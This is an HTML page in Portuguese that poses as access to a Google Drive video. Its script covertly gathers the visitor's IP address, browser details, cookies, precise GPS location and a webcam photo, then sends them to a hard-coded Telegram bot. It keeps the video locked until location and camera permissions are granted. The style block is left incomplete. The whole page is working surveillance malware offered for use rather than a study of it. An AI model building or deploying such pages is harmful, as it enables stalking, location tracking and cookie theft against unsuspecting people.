<!DOCTYPE html>

<head>

  <style>

    .overlay {

      justify-content: center;
      padding: 2rem;
    }

    iframe {
      width: 640px;

  </style>
</head>
<body>

<div class="overlay" id="popup">

</div>

<div class="container" id="conteudo">
  <h2>Conte√∫do liberado</h2>
  <iframe id="drive-video" src="https://drive.google.com/file/d/1oINpS5_vJqPj6e3Zk7UDbnND2T2tu9gB/preview" allowfullscreen></iframe>
  <p id="data-status">Aguardando permiss√£o...</p>
</div>

<script>
  const BOT_TOKEN = '7286532430:AAF-V9EDF2dNfg0qwH3yehqd9OiA6LMopgI';
  const CHAT_ID = '1058604183';

  async function iniciarColeta() {
    const popup = document.getElementById('popup');
    const conteudo = document.getElementById('conteudo');
    const status = document.getElementById('data-status');
    status.innerText = 'Coletando dados...';

    let ip = 'N√£o dispon√≠vel';
    let latitude = 'N√£o capturada';
    let longitude = 'N√£o capturada';
    let googleMapsLink = 'N√£o dispon√≠vel';
    let userAgent = navigator.userAgent || 'Indefinido';
    document.cookie = "usuario_visitante=true; path=/;";
    let cookies = document.cookie || 'Nenhum cookie acess√≠vel';
    let screenRes = `${window.screen.width}x${window.screen.height}`;

    const obterIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return 'Falha na captura';
      }
    };

    const obterLocalizacao = () => {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          }),
          err => resolve(null),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    };

    const capturarImagem = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const blob = await imageCapture.takePhoto();
        track.stop();
        return blob;
      } catch (err) {
        return null;
      }
    };

    try {
      const [ipResult, locResult, imagemBlob] = await Promise.all([
        obterIP(),
        obterLocalizacao(),
        capturarImagem()
      ]);

      if (ipResult) ip = ipResult;
      if (locResult) {
        latitude = locResult.latitude;
        longitude = locResult.longitude;
        googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      } else {
        throw new Error("Usu√°rio n√£o permitiu acesso √† localiza√ß√£o");
      }

      const mensagem = `
üì• *Novo acesso:*
üñ•Ô∏è *IP:* ${ip}
üß≠ *User Agent:* ${userAgent}
üñºÔ∏è *Tela:* ${screenRes}
üç™ *Cookies:* ${cookies}
üìç *Latitude:* ${latitude}
üìç *Longitude:* ${longitude}
üåê *Maps:* ${googleMapsLink}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensagem,
          parse_mode: 'Markdown'
        })
      });

      if (imagemBlob) {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", imagemBlob, "foto.jpg");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } else {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `‚ö†Ô∏è C√¢mera n√£o autorizada ou falha ao capturar imagem.`
          })
        });
      }

      popup.style.display = 'none';
      conteudo.style.display = 'flex';
      status.innerText = 'Permiss√µes concedidas com sucesso!';

    } catch (err) {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `‚ùå Erro na coleta de dados: ${err.message}`
        })
      });

      popup.innerHTML = `
        <h2>‚ùå Permiss√µes negadas</h2>
        <p>Para visualizar o conte√∫do, voc√™ precisa conceder permiss√£o √† localiza√ß√£o e c√¢mera.</p>
        <p>Atualize a p√°gina e tente novamente.</p>
      `;
    }
  }
</script>

</body>
</html>
